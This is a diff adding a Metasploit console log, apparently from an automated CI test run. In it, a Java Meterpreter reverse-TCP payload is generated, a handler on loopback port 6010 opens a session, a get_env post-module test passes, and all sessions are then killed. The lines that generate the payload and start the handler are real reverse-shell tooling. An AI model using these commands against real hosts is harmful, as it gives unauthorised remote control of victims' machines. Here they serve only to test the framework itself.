@@ -1,0 +1,29 @@
+use java/meterpreter/reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20240307-5732-yg5hatxt
+msf6 payload(java/meterpreter/reverse_tcp) > msf6 payload(java/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20240307-5732-yg5hatxt
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20240307-5732-175ps.jar -f jar AutoVerifySessionTimeout=30 lport=6010 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20240307-5732-k3jh1xtxt spawn=0
+[*] Writing 5259 bytes to D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20240307-5732-175ps.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler AutoVerifySessionTimeout=30 lport=6010 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20240307-5732-k3jh1xtxt spawn=0
+[*] Payload Handler Started as Job 9
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6010 
+[*] Sending stage (57971 bytes) to 127.0.0.1
+[*] Meterpreter session 10 opened (127.0.0.1:6010 -> 127.0.0.1:50106) at 2024-03-07 09:39:44 +0000
+use test/get_env
+msf6 post(test/get_env) > run session=10 AddEntropy=true Verbose=true
+[*] Running against session 10
+[*] Session type is meterpreter and platform is windows
+[+] should return windows path
+[+] should handle % signs
+[+] should return multiple envs
+[*] Testing complete in 0.05 seconds
+[*] Passed: 3; Failed: 0; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/get_env) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 10 closed.
+msf6 post(test/get_env) > Stopping all jobs...
+msf6 post(test/get_env) > 
